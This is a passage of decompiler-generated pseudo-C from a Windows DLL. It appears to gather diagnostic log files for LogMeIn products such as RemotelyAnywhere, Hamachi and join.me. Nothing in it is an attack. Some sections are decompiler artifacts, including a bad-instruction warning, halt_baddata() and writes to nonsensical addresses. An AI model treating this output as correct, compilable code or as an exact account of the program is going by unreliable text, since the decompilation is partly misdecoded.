      puVar15 = (undefined4 *)&stack0xfffffffc;
    }
  }
  while( true ) {
    iVar4 = puVar15[-0x93];
    puVar15[-0x91] = iVar4;
    if (psVar14 == (short *)0x0) {
      uVar6 = 0;
    }
    else {
      if ((iVar4 == 0) || (ppuVar13 = (undefined **)(iVar4 + 0xc), ppuVar13 == (undefined **)0x0)) {
        ppuVar13 = &PTR_10083554;
      }
      uVar26 = 0x100249fd;
      uVar6 = FUN_1004b7e0(ppuVar13);
      puVar15[-0x8b] = uVar6;
    }
    uVar8 = puVar15[-0x86];
    puVar15[-0xb5] = 0;
    puVar15[-0xba] = 0;
    puVar15[-0x8c] = uVar8;
    uVar1 = puVar15[-0x84];
    if ((puVar15[-0x84] == 0) && (uVar1 = uVar6, uVar6 == 0)) goto LAB_10024acd;
    bVar16 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;
    uVar26 = 1;
    uVar24 = 0x40;
    pcVar7 = (code *)FUN_105b914d(0x40);
    *(longlong *)(unaff_EBX + 0x74f685f0) = (longlong)extraout_ST0;
    if (bVar16) break;
    puVar15 = (undefined4 *)*puVar15;
    psVar14 = extraout_ECX_00;
  }
  puVar15 = (undefined4 *)&DAT_fffffdf0;
  psVar14 = extraout_ECX_00 + 0x803c932;
  *(char *)psVar14 = (char)*psVar14 + (char)((uint)pcVar7 >> 8);
  if ((char)*psVar14 != '\0') {
    uVar24 = 2;
    uVar8 = (*pcVar7)(0xfffffb1c,0x100000,0,2,uVar26,uVar8);
    FUN_103fc1fc(piVar5,_DAT_fffffbe0,uVar8);
    unaff_EBX = unaff_EBX + 1;
    pcVar7 = DAT_10079264;
    if (_DAT_fffffac0 != (undefined4 *)0x0) {
      *_DAT_fffffac0 = _DAT_fffffb1c;
      pcVar7 = DAT_10079264;
    }
  }
  if (_DAT_fffffbc4 != 0) {
    uVar26 = 0;
    uVar24 = 0x100000;
    uVar8 = (*pcVar7)(0xfffffb08,0x100000,0,2);
    FUN_1059119f(piVar5,piVar5,_DAT_fffffbc4,uVar8);
  }
  uVar8 = _DAT_fffffbc0;
  if (DAT_10079270 != (code *)0x0) {
    uVar26 = 0x10024ac7;
    (*DAT_10079270)(piVar5);
    uVar8 = _DAT_fffffbc0;
  }
LAB_10024acd:
  piVar5 = (int *)puVar15[-0x92];
  if ((piVar5 == (int *)0x0) || (ppuVar13 = (undefined **)(piVar5 + 3), piVar5[2] == 0)) {
    ppuVar13 = &PTR_10083554;
  }
  FUN_10027300(ppuVar13,uVar8,uVar8,uVar24,uVar26,puVar15[-0xba]);
  *(undefined1 *)(puVar15 + -1) = 8;
  piVar9 = (int *)FUN_1000ae10(puVar15 + -0xd3);
  if (*piVar9 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *piVar9 + 0xc;
  }
  FUN_10006250("waiting for event: %s\n",iVar4);
  piVar9 = (int *)puVar15[-0xd3];
  if (piVar9 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar9;
    *piVar9 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar9);
      piVar9 = extraout_ECX_01;
    }
  }
  *(undefined4 *)(puVar15[-0x7d] + 4) = 1;
  iVar4 = puVar15[-0xb0];
  if ((iVar4 == 0) || (*(int *)(iVar4 + 8) == 0)) {
    ppuVar13 = &PTR_10083554;
  }
  else {
    ppuVar13 = (undefined **)(iVar4 + 0xc);
  }
  FUN_10033760(ppuVar13,puVar15[-0x8c],piVar9,puVar15[-0xcf],puVar15[-0xb5]);
  *(undefined1 *)(puVar15 + -1) = 9;
  iVar4 = puVar15[-0x99];
  iVar10 = puVar15[-0x7d];
  *(undefined4 *)(iVar10 + 4) = 2;
  if (iVar4 == 0) {
    if (((int *)puVar15[-0xbf] != (int *)0x0) && (*(int *)puVar15[-0xbf] != 0)) {
      iVar4 = puVar15[-0xbe];
      cVar18 = '\0';
      cVar17 = iVar4 < 0;
      *(undefined4 *)(iVar10 + 4) = 6;
      if (iVar4 == 0) {
        puVar15[-9] = 0;
        puVar15[-8] = 0;
        puVar15[-7] = 0;
        puVar15[-6] = 0;
        FUN_1063da4e(puVar15 + -9);
        if (cVar18 != cVar17) {
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
        uVar24 = FUN_10032eb0();
        if (puVar15[-0xbe] == 0) {
          uVar26 = *(undefined4 *)(puVar15[-0xbf] + 0x420);
        }
        else {
          uVar26 = *(undefined4 *)(puVar15[-0xbf] + 0x420);
        }
        FUN_1001e9f0(uVar24,puVar15 + -9,uVar26);
        if (puVar15[-0xe5] == 0) {
          iVar4 = 0;
        }
        else {
          iVar4 = puVar15[-0xe5] + 0xc;
        }
        FUN_1000ad00(iVar4,0xffffffff);
        *(undefined1 *)(puVar15 + -1) = 0x18;
        (*DAT_10079270)(uVar24);
        FUN_1001f2a0(extraout_ECX_02,puVar15 + -0x7c,puVar15 + -0x7f);
        if (*(int *)puVar15[-0x124] == 0) {
          iVar4 = 0;
        }
        else {
          iVar4 = *(int *)puVar15[-0x124] + 0xc;
        }
        FUN_1000ad00(iVar4,0xffffffff);
        *(undefined1 *)(puVar15 + -1) = 0x1a;
        cVar17 = FUN_1000b5f0();
        piVar3 = (int *)puVar15[-0x7c];
        if (cVar17 == '\0') {
          puVar15[-0x9d] = piVar3;
          if (piVar3 != (int *)0x0) {
            LOCK();
            *piVar3 = *piVar3 + 1;
            UNLOCK();
          }
          FUN_10027850();
          FUN_10019e10(puVar15 + -0xc9);
          uVar2 = FUN_1000b5f0();
          *(undefined1 *)((int)puVar15 + -0x1f5) = uVar2;
          FUN_10006f30();
          if (*(char *)((int)puVar15 + -0x1f5) == '\0') {
            cVar17 = FUN_10019d30(&DAT_1008401c,extraout_ECX_03);
            if (cVar17 == '\0') {
              uVar24 = FUN_1000bfa0(&DAT_1008401c,0xffffffff);
              puVar15[-0x82] = uVar24;
            }
            uVar24 = FUN_10019e10(puVar15 + -0xae);
            FUN_1000ad40(uVar24);
            FUN_10006f30();
          }
          else {
            FUN_1000b610();
          }
          FUN_10006f30();
        }
        FUN_10023360(L"serialize access to dbghelp.dll");
        *(undefined1 *)(puVar15 + -1) = 0x1b;
        puVar15[-0x8b] = 0;
        FUN_1000e7c0();
        *(undefined1 *)(puVar15 + -1) = 0x1c;
        iVar4 = 0x3d;
        do {
          iVar10 = FUN_10023490(1000);
          if (iVar10 != 0) break;
          iVar4 = iVar4 + -1;
        } while (iVar4 != 0);
        if (puVar15[-0xea] == 0) {
LAB_10025f14:
          uVar24 = 0;
          puVar15[-0x9c] = 0;
          piVar3 = *(int **)puVar15[-200];
          if (piVar3 != (int *)puVar15[-200]) {
            do {
              uVar26 = FUN_10006f50();
              FUN_10027a00(uVar26);
              FUN_10027a40();
              puVar15[-0x8f] = 0;
              do {
                FUN_10019e10(puVar15 + -0xd6);
                *(undefined1 *)(puVar15 + -1) = 0x55;
                uVar2 = FUN_10026a90(*(undefined4 *)
                                      ((int)&PTR_s_avutil_51_dll_10084d70 + puVar15[-0x8f]));
                *(undefined1 *)((int)puVar15 + -0x1e5) = uVar2;
                FUN_10006f30();
                if (*(char *)((int)puVar15 + -0x1e5) != '\0') {
                  uVar24 = FUN_10006f50();
                  FUN_10027a00(uVar24);
                  FUN_10028c10(1);
                  uVar24 = FUN_10019e10(puVar15 + -0xd1);
                  *(undefined1 *)(puVar15 + -1) = 0x57;
                  FUN_10026a20(uVar24);
                  FUN_10006f30();
                  FUN_10006f30();
                  FUN_10006f30();
                  uVar24 = puVar15[-0x9c];
                  goto LAB_1002603e;
                }
                iVar4 = puVar15[-0x8f];
                puVar15[-0x8f] = iVar4 + 4U;
              } while (iVar4 + 4U < 0x244);
              FUN_10006f30();
              piVar3 = (int *)*piVar3;
            } while (piVar3 != (int *)puVar15[-200]);
          }
LAB_1002603e:
          *(undefined1 *)(puVar15 + -1) = 0x58;
          puVar15[-0x80] = 0;
          do {
            FUN_10010440(uVar24);
            uVar26 = FUN_1000bfa0(puVar15[puVar15[-0x80] + -0xc6],0xffffffff);
            puVar15[-0xa0] = uVar26;
            FUN_100213b0(puVar15 + -0xa0);
            if ((puVar15[-0x3d] != 0) || (puVar15[-0x3c] != 0)) goto LAB_100261b6;
            iVar4 = puVar15[-0x80];
            puVar15[-0x80] = iVar4 + 1U;
          } while (iVar4 + 1U < 2);
          puVar15[-0x80] = 0;
          do {
            uVar26 = FUN_10010440(uVar24);
            puVar15[-0xa0] = uVar26;
            FUN_10021a40(0,0);
            FUN_1000ace0(puVar15 + -0xb2);
            *(undefined1 *)(puVar15 + -1) = 0x5a;
            FUN_1000c8c0();
            puVar12 = (undefined4 *)FUN_10019e10(puVar15 + -0xd5);
            FUN_10010440(*puVar12);
            FUN_10006f30();
            uVar26 = FUN_1000bfa0(puVar15[puVar15[-0x80] + -0xc6],0xffffffff);
            puVar15[-0xa0] = uVar26;
            FUN_100213b0(puVar15 + -0xa0);
            if ((puVar15[-0x31] != 0) || (puVar15[-0x30] != 0)) {
              FUN_10006f30();
              *(undefined1 *)(puVar15 + -1) = 0x58;
              FUN_10006f30();
              break;
            }
            FUN_10006f30();
            *(undefined1 *)(puVar15 + -1) = 0x58;
            FUN_10006f30();
            iVar4 = puVar15[-0x80];
            puVar15[-0x80] = iVar4 + 1U;
          } while (iVar4 + 1U < 2);
LAB_100261b6:
          iVar4 = FUN_10010440(uVar26);
          puVar15[-0x9c] = iVar4;
          FUN_100213b0(puVar15 + -0x9c);
          puVar15[-0xb4] = 0;
          *(undefined1 *)(puVar15 + -1) = 0x5b;
          iVar10 = FUN_10022880(L"/CUSTOM",0xffffffff,extraout_ECX_15);
          if (iVar10 == -1) {
LAB_10026255:
            iVar10 = 0;
          }
          else {
            uVar24 = FUN_1000bdd0(L" /CUSTOM ",extraout_ECX_16);
            puVar15[-0xb4] = uVar24;
            uVar24 = extraout_ECX_17;
            uVar26 = FUN_1000adf0(extraout_ECX_17);
            FUN_10033a00(uVar26,uVar24);
            uVar24 = FUN_10034410();
            iVar10 = FUN_1000bfa0(uVar24,0xffffffff);
            puVar15[-0xb4] = iVar10;
            if (iVar10 == 0) goto LAB_10026255;
            iVar10 = iVar10 + 0xc;
          }
          if (iVar4 == 0) {
            iVar4 = 0;
          }
          else {
            iVar4 = iVar4 + 0xc;
          }
          FUN_10040d40(iVar4,iVar10);
          FUN_10006f30();
          FUN_10006f30();
          FUN_10006f30();
        }
        else {
          puVar15[-0x8a] = 0;
          puVar15[-0x89] = 0;
          puVar15[-0x88] = 0;
          *(undefined1 *)(puVar15 + -1) = 0x1d;
          FUN_10026e00(2);
          cVar17 = FUN_1000b5f0();
          if (cVar17 == '\0') {
            *(undefined1 *)((int)puVar15 + -0x1f5) = 1;
            FUN_10026dd0((undefined1 *)((int)puVar15 + -0x1f5));
          }
          *(undefined1 *)((int)puVar15 + -0x1e5) = 0;
          FUN_10026dd0((undefined1 *)((int)puVar15 + -0x1e5));
          uVar6 = 0;
          puVar15[-0x7b] = 0;
          if (puVar15[-0x89] != 0) {
            do {
              if (*(char *)(uVar6 + puVar15[-0x8a]) == '\0') {
                if (puVar15[-0xe5] == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = puVar15[-0xe5] + 0xc;
                }
                piVar3 = (int *)FUN_1000bdd0(iVar4,puVar15[-0x8a]);
              }
              else {
                piVar3 = (int *)FUN_10010440(puVar15[-0x82]);
              }
              puVar12 = puVar15 + -0xc4;
              puVar15[-0x7c] = piVar3;
              uVar24 = FUN_1000adf0(puVar12);
              FUN_1002ed90(uVar24,puVar12);
              *(undefined1 *)(puVar15 + -1) = 0x1e;
              FUN_104db7c7(puVar15,0);
              uVar24 = puVar15[-0x4f];
              uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
              puVar12 = puVar15 + -0xc4;
              uVar26 = FUN_1000adf0(puVar12,uVar6,uVar24);
              FUN_10032380(uVar26,puVar12,uVar6,uVar24);
              *(undefined1 *)(puVar15 + -1) = 0x1f;
              FUN_10417d8c(piVar3,0);
              FUN_1002ef10();
              FUN_10027ab0(*(undefined4 *)puVar15[-0x4e],(undefined4 *)puVar15[-0x4e]);
              FUN_10031550();
              puVar15[-0xa5] = piVar3;
              if (piVar3 != (int *)0x0) {
                LOCK();
                *piVar3 = *piVar3 + 1;
                UNLOCK();
              }
              *(undefined1 *)(puVar15 + -1) = 0x20;
              uVar24 = FUN_10020e80(L".xml");
              uVar24 = FUN_1000bdd0(uVar24,extraout_ECX_04);
              *(undefined4 *)puVar15[-0x7d] = uVar24;
              iVar4 = puVar15[-0x69];
              if (iVar4 == 0) {
                puVar15[-0x86] = 0;
                puVar15[-0x96] = 0;
              }
              else {
                puVar15[-0x86] = *(undefined4 *)(iVar4 + 8);
                puVar15[-0x96] = iVar4 + 0xc;
              }
              uVar24 = FUN_1000adf0();
              FUN_100278c0(uVar24);
              uVar24 = FUN_1000bfa0(&DAT_10083854,0xffffffff);
              puVar15[-0x7f] = uVar24;
              FUN_1000ad40(puVar15[-0x7d]);
              piVar3 = (int *)puVar15[-0xa5];
              puVar15[-0x86] = 0;
              puVar15[-0xa6] = piVar3;
              if (piVar3 != (int *)0x0) {
                LOCK();
                *piVar3 = *piVar3 + 1;
                UNLOCK();
              }
              FUN_1000c820(0);
              FUN_1000c820(1);
              if (puVar15[-0xa6] == 0) {
                iVar4 = 0;
              }
              else {
                iVar4 = puVar15[-0xa6] + 0xc;
              }
              FUN_1000ad00(iVar4,0xffffffff);
              uVar24 = FUN_1000bfa0(L"LocalHashes.xml",0xffffffff);
              puVar15[-0xad] = uVar24;
              puVar15[-0xb3] = 0;
              iVar10 = 0;
              puVar15[-0xb9] = 0;
              *(undefined1 *)(puVar15 + -1) = 0x24;
              FUN_10023360(L"serialize access to LocalHashes.xml");
              *(undefined1 *)(puVar15 + -1) = 0x25;
              iVar4 = 0x29;
              do {
                iVar11 = FUN_10023490(1000);
                if (iVar11 != 0) break;
                iVar4 = iVar4 + -1;
              } while (iVar4 != 0);
              piVar3 = (int *)puVar15[-0x7c];
              if (puVar15[-0xed] != 0) {
                uVar24 = FUN_1000adf0();
                FUN_100387c0(uVar24);
                piVar5 = (int *)FUN_10019e10(puVar15 + -0xce);
                *(undefined1 *)(puVar15 + -1) = 0x27;
                if (*piVar5 == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = *piVar5 + 0xc;
                }
                uVar24 = FUN_100388c0(iVar4,puVar15 + -0xb3,1);
                puVar15[-0xae] = uVar24;
                FUN_10006f30();
                if ((undefined4 *)puVar15[-0xae] != (undefined4 *)0x0) {
                  iVar10 = FUN_10010440(*(undefined4 *)puVar15[-0xae]);
                  puVar15[-0xb9] = iVar10;
                }
                uVar24 = puVar15[-0x8b];
                if (puVar15[-0x1a3] != 0) {
                  uVar24 = 1;
                }
                *(undefined1 *)(puVar15 + -1) = 0x25;
                puVar15[-0x8b] = uVar24;
                FUN_1003d1f0();
              }
              if (((*(char *)(puVar15[-0x7b] + puVar15[-0x8a]) == '\0') &&
                  (FUN_1003fa10(1,0xc0020068), iVar10 != 0)) && (iVar10 != -0xc)) {
                puVar15[-0xd7] = piVar3;
                if (piVar3 == (int *)0x0) {
                  piVar3 = (int *)0x0;
                }
                else {
                  LOCK();
                  *piVar3 = *piVar3 + 1;
                  UNLOCK();
                  piVar3 = piVar3 + 3;
                }
                FUN_1005a7b5(piVar3);
                FUN_10006f30();
                if (*(int *)puVar15[-0x7d] == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = *(int *)puVar15[-0x7d] + 0xc;
                }
                FUN_1005a7b5(iVar4);
                puVar15[-0x86] = 1;
              }
              FUN_100236e0();
              FUN_10006f30();
              FUN_10006f30();
              FUN_10006f30();
              *(undefined1 *)(puVar15 + -1) = 0x20;
              FUN_10006f30();
              if (puVar15[-0x86] != 0) goto switchD_10025333_caseD_6;
              uVar24 = extraout_ECX_05;
              uVar26 = FUN_1000adf0(extraout_ECX_05);
              FUN_10033a00(uVar26,uVar24);
              iVar4 = puVar15[-0xcb];
              if (iVar4 == 0) {
                iVar4 = 1;
              }
              switch(iVar4) {
              case 1:
                puVar15[-0xfa] = DAT_1009abd0;
                if (DAT_1009abd0 != (int *)0x0) {
                  LOCK();
                  *DAT_1009abd0 = *DAT_1009abd0 + 1;
                  UNLOCK();
                }
                puVar15[-0xf9] = DAT_1009abd4;
                if (DAT_1009abd4 != (int *)0x0) {
                  LOCK();
                  *DAT_1009abd4 = *DAT_1009abd4 + 1;
                  UNLOCK();
                }
                *(undefined1 *)(puVar15 + -1) = 0x29;
                if ((DAT_10099158 & 1) == 0) {
                  DAT_10099158 = DAT_10099158 | 1;
                  FUN_100064d0();
                  FUN_10057b51(&LAB_10078190);
                }
                puVar15[-0xf8] = &DAT_100990d8;
                puVar15[-0xf7] = 0;
                puVar15[-0xf6] = 0;
                uVar24 = FUN_10017840();
                puVar15[-0xf7] = uVar24;
                *(undefined1 *)(puVar15 + -1) = 0x2a;
                puVar15[-0xf5] = 0;
                puVar15[-0xf4] = 0;
                uVar24 = FUN_10017840();
                puVar15[-0xf5] = uVar24;
                puVar15[-0xf3] = _DAT_1008c410;
                puVar15[-0xf2] = _UNK_1008c414;
                puVar15[-0xf1] = _UNK_1008c418;
                puVar15[-0xf0] = _UNK_1008c41c;
                *(undefined1 *)(puVar15 + -1) = 0x30;
                FUN_1001f080(extraout_ECX_06,L"\\LogMeIn",&PTR_10083554,0);
                if (*(int *)puVar15[-0x12a] == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = *(int *)puVar15[-0x12a] + 0xc;
                }
                FUN_1000ad00(iVar4,0xffffffff);
                puVar15[-0x9f] = 0;
                *(undefined1 *)(puVar15 + -1) = 0x33;
                FUN_1003a870(L"..\\Log\\Directory",puVar15 + -0x9f,1,1);
                FUN_1000e5b0();
                cVar17 = FUN_1000b5f0();
                if (cVar17 == '\0') {
                  iVar4 = FUN_10010440(puVar15[-0x9f]);
                  puVar15[-0xa4] = iVar4;
                }
                else {
                  iVar4 = puVar15[-0xa4];
                }
                if (iVar4 == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = iVar4 + 0xc;
                }
                uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                uVar26 = 2;
                pwVar21 = L"*.log";
                uVar24 = FUN_1000adf0(L"*.log",iVar4,2,uVar6);
                FUN_10035c00(uVar24,pwVar21,iVar4,uVar26,uVar6);
                FUN_1000ba10();
                thunk_FUN_100579ee(puVar15[-0x119]);
                FUN_10006f30();
                FUN_10006f30();
                FUN_1000ab80();
                break;
              case 2:
                FUN_1001be20(2);
                puVar15[-0x141] = 0;
                puVar15[-0x140] = 0;
                *(undefined1 *)(puVar15 + -1) = 0x34;
                FUN_1001f080(extraout_ECX_07,L"\\RemotelyAnywhere",&PTR_10083554,0);
                if (*(int *)puVar15[-0x134] == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = *(int *)puVar15[-0x134] + 0xc;
                }
                FUN_1000ad00(iVar4,0xffffffff);
                puVar15[-0xa1] = 0;
                *(undefined1 *)(puVar15 + -1) = 0x37;
                FUN_1003a870(L"..\\Log\\Directory",puVar15 + -0xa1,1,1);
                FUN_1000e5b0();
                cVar17 = FUN_1000b5f0();
                if (cVar17 == '\0') {
                  iVar4 = FUN_10010440(puVar15[-0xa1]);
                  puVar15[-0xa8] = iVar4;
                }
                else {
                  iVar4 = puVar15[-0xa8];
                }
                if (iVar4 == 0) {
                  iVar4 = 0;
                }
                else {
                  iVar4 = iVar4 + 0xc;
                }
                uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                uVar26 = 2;
                pwVar21 = L"*.log";
                uVar24 = FUN_1000adf0(L"*.log",iVar4,2,uVar6);
                FUN_10035c00(uVar24,pwVar21,iVar4,uVar26,uVar6);
                FUN_1000ba10();
                thunk_FUN_100579ee(puVar15[-0x10a]);
                FUN_10006f30();
                FUN_10006f30();
                FUN_1000ab80();
                break;
              case 3:
                uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                uVar8 = 0;
                uVar26 = 0;
                uVar24 = FUN_1000adf0(0,0,uVar6);
                FUN_10035ef0(uVar24,uVar26,uVar8,uVar6);
                FUN_1000ba10();
                thunk_FUN_100579ee(puVar15[-0x105]);
                goto switchD_10025333_caseD_6;
              case 4:
                FUN_1000ace0(puVar15 + -0xe4);
                FUN_1000ad00(L"LogMeInBackupServer.log",0xffffffff);
                FUN_1000ad00(L"LMIBS*.log",0xffffffff);
                *(undefined1 *)(puVar15 + -1) = 0x3a;
                iVar4 = FUN_10019c80(L"LogmeInBackupService");
                if (iVar4 != 0) {
                  iVar4 = FUN_10019c80(L"LMIBackupVSSService");
                  uVar24 = extraout_ECX_08;
                  if ((iVar4 == 0) ||
                     (iVar4 = FUN_10019c80(L"LMIBackupVSSServiceX64"), uVar24 = extraout_ECX_09,
                     iVar4 == 0)) {
                    uVar26 = FUN_1000bdd0(L"LogMeInVSSService.log",uVar24);
                    pwVar21 = L"LMIVS*.log";
                    uVar24 = extraout_ECX_14;
                  }
                  else {
                    iVar4 = FUN_10019c80(L"LogMeInBackup");
                    if (iVar4 == 0) {
                      uVar26 = FUN_1000bdd0(L"LogMeInBackupClient.log",extraout_ECX_10);
                      pwVar21 = L"LMIBC*.log";
                      uVar24 = extraout_ECX_11;
                    }
                    else {
                      iVar4 = FUN_10019c80(L"BackupSystray");
                      if (iVar4 != 0) goto LAB_10025794;
                      uVar26 = FUN_1000bdd0(&DAT_10083be4,extraout_ECX_12);
                      pwVar21 = L"-";
                      uVar24 = extraout_ECX_13;
                    }
                  }
                  puVar15[-0x85] = uVar26;
                  uVar24 = FUN_1000bdd0(pwVar21,uVar24);
                  puVar15[-0x87] = uVar24;
                }
LAB_10025794:
                uVar27 = 0;
                uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                uVar25 = 2;
                uVar24 = FUN_1000adf0(2,uVar6,0);
                uVar26 = FUN_1000adf0(uVar24);
                pwVar21 = L"LogMeInBackup";
                uVar23 = 0x23;
                uVar8 = FUN_1000adf0(0x23,L"LogMeInBackup",uVar26);
                FUN_10036de0(uVar8,uVar23,pwVar21,uVar26,uVar24,uVar25,uVar6,uVar27);
                FUN_1000ba10();
                thunk_FUN_100579ee(puVar15[-0x10f]);
                FUN_10006f30();
                FUN_10006f30();
                FUN_10006f30();
                goto switchD_10025333_caseD_6;
              case 5:
                FUN_1001be20(5);
                puVar15[-0x136] = 0;
                puVar15[-0x135] = 0;
                *(undefined1 *)(puVar15 + -1) = 0x3b;
                if (puVar15[-0x137] == 1) {
                  uVar23 = 0;
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar8 = 2;
                  pwVar20 = L"*.log";
                  pwVar19 = L"LogMeInIgnition.log";
                  pwVar21 = L"LogMeInIgnition";
                  uVar26 = 0x1c;
                  uVar24 = FUN_1000adf0(0x1c,L"LogMeInIgnition",L"LogMeInIgnition.log",L"*.log",2,
                                        uVar6,0);
                  FUN_10036de0(uVar24,uVar26,pwVar21,pwVar19,pwVar20,uVar8,uVar6,uVar23);
                  FUN_1000ba10();
                  thunk_FUN_100579ee(puVar15[-0x114]);
                }
                else if (puVar15[-0x137] == 2) {
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar26 = 1;
                  puVar22 = &DAT_10084cac;
                  pwVar21 = L"*.log";
                  uVar24 = FUN_1000adf0(L"*.log",&DAT_10084cac,1,uVar6);
                  FUN_10035c00(uVar24,pwVar21,puVar22,uVar26,uVar6);
                  FUN_1000ba10();
                  thunk_FUN_100579ee(puVar15[-0x11e]);
                }
                break;
              default:
                goto switchD_10025333_caseD_6;
              case 7:
                iVar4 = puVar15[-0x7b];
                uVar23 = 1;
                uVar6 = (uint)*(byte *)(iVar4 + puVar15[-0x8a]);
                uVar8 = 1;
                ppuVar13 = &PTR_10083554;
                pwVar19 = L"h2-*.log";
                pwVar21 = L"LogMeIn Hamachi";
                uVar26 = 0x1c;
                uVar24 = FUN_1000adf0(0x1c,L"LogMeIn Hamachi",L"h2-*.log",&PTR_10083554,1,uVar6,1);
                FUN_10036de0(uVar24,uVar26,pwVar21,pwVar19,ppuVar13,uVar8,uVar6,uVar23);
                puVar15[-0xe2] = DAT_1009abd0;
                if (DAT_1009abd0 != (int *)0x0) {
                  LOCK();
                  *DAT_1009abd0 = *DAT_1009abd0 + 1;
                  UNLOCK();
                }
                puVar15[-0xe1] = DAT_1009abd4;
                if (DAT_1009abd4 != (int *)0x0) {
                  LOCK();
                  *DAT_1009abd4 = *DAT_1009abd4 + 1;
                  UNLOCK();
                }
                *(undefined1 *)(puVar15 + -1) = 0x3e;
                if ((DAT_10099158 & 1) == 0) {
                  DAT_10099158 = DAT_10099158 | 1;
                  FUN_100064d0();
                  FUN_10057b51(&LAB_10078190);
                }
                puVar15[-0xe0] = &DAT_100990d8;
                puVar15[-0xdf] = 0;
                puVar15[-0xde] = 0;
                uVar24 = FUN_10017840();
                puVar15[-0xdf] = uVar24;
                *(undefined1 *)(puVar15 + -1) = 0x3f;
                puVar15[-0xdd] = 0;
                puVar15[-0xdc] = 0;
                uVar24 = FUN_10017840();
                puVar15[-0xdd] = uVar24;
                puVar15[-0xdb] = 7;
                puVar15[-0xda] = 0;
                uVar24 = FUN_10010440(DAT_1009ac08);
                puVar15[-0xe2] = uVar24;
                uVar24 = FUN_10010440(DAT_1009ac08);
                puVar15[-0xe1] = uVar24;
                puVar15[-0xd9] = 0;
                puVar15[-0xd8] = 0;
                puVar15[-0xaf] = 0;
                *(undefined1 *)(puVar15 + -1) = 0x46;
                FUN_1003a870(L"EngineConfigDir",puVar15 + -0xaf,1,0);
                if (puVar15[-0xaf] == 0) {
                  iVar10 = 0;
                }
                else {
                  iVar10 = puVar15[-0xaf] + 0xc;
                }
                uVar6 = (uint)*(byte *)(iVar4 + puVar15[-0x8a]);
                uVar26 = 2;
                pwVar21 = L"h2-*.log";
                uVar24 = FUN_1000adf0(L"h2-*.log",iVar10,2,uVar6);
                FUN_10035c00(uVar24,pwVar21,iVar10,uVar26,uVar6);
                FUN_10008e20();
                FUN_10006f30();
                FUN_1003a170();
                FUN_10008e20();
                goto switchD_10025333_caseD_6;
              case 8:
                FUN_1003a140(8);
                FUN_1000ad00(&DAT_10083854,0xffffffff);
                *(undefined1 *)(puVar15 + -1) = 0x48;
                FUN_1003a870(L"LogFiles",puVar15 + -0xa3,0,1);
                FUN_1000e5b0();
                cVar17 = FUN_1000b5f0();
                if (cVar17 == '\0') {
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar24 = FUN_1000adf0(uVar6);
                  uVar8 = 2;
                  uVar26 = FUN_1000adf0(2,uVar24);
                  FUN_10035ef0(uVar26,uVar8,uVar24,uVar6);
                  FUN_10008e20();
                }
                FUN_10006f30();
                break;
              case 9:
                FUN_1003a140(9);
                FUN_1000ad00(&DAT_10083854,0xffffffff);
                *(undefined1 *)(puVar15 + -1) = 0x4a;
                FUN_1003a870(L"LogFiles",puVar15 + -0x98,0,0);
                FUN_1000e5b0();
                cVar17 = FUN_1000b5f0();
                if (cVar17 == '\0') {
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar24 = FUN_1000adf0(uVar6);
                  uVar8 = 2;
                  uVar26 = FUN_1000adf0(2,uVar24);
                  FUN_10035ef0(uVar26,uVar8,uVar24,uVar6);
                  FUN_10008e20();
                  FUN_10006f30();
                }
                else {
                  puVar15[-0xb7] = 0;
                  *(undefined1 *)(puVar15 + -1) = 0x4b;
                  FUN_10021a40(0,0);
                  FUN_1000ace0(puVar15 + -0xbb);
                  *(undefined1 *)(puVar15 + -1) = 0x4d;
                  FUN_1000c8c0();
                  puVar12 = (undefined4 *)FUN_10019e10(puVar15 + -0xd2);
                  iVar4 = FUN_10010440(*puVar12);
                  puVar15[-0xb7] = iVar4;
                  FUN_10006f30();
                  if (iVar4 == 0) {
                    iVar4 = 0;
                  }
                  else {
                    iVar4 = iVar4 + 0xc;
                  }
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar26 = 1;
                  pwVar21 = L"join.me.log";
                  uVar24 = FUN_1000adf0(L"join.me.log",iVar4,1,uVar6);
                  FUN_10035c00(uVar24,pwVar21,iVar4,uVar26,uVar6);
                  FUN_10008e20();
                  FUN_10006f30();
                  FUN_10006f30();
                  FUN_10006f30();
                  FUN_10006f30();
                }
                break;
              case 10:
                FUN_1003a140(10);
                FUN_1000ad00(&DAT_10083854,0xffffffff);
                *(undefined1 *)(puVar15 + -1) = 0x4f;
                FUN_1003a870(L"LogFiles",puVar15 + -0x9e,0,0);
                FUN_1000e5b0();
                cVar17 = FUN_1000b5f0();
                if (cVar17 == '\0') {
                  uVar6 = (uint)*(byte *)(puVar15[-0x7b] + puVar15[-0x8a]);
                  uVar24 = FUN_1000adf0(uVar6);
                  uVar8 = 2;
                  uVar26 = FUN_1000adf0(2,uVar24);
                  FUN_10035ef0(uVar26,uVar8,uVar24,uVar6);
                  FUN_10008e20();
                }
                else {
                  puVar15[-0x97] = 0;
                  *(undefined1 *)(puVar15 + -1) = 0x50;
                  FUN_10021a40(0,0);
                  FUN_1000ace0(puVar15 + -0xb8);
                  *(undefined1 *)(puVar15 + -1) = 0x52;
                  FUN_1000c8c0();
                  puVar12 = (undefined4 *)FUN_10019e10(puVar15 + -0xd4);
                  iVar4 = FUN_10010440(*puVar12);
                  puVar15[-0x97] = iVar4;
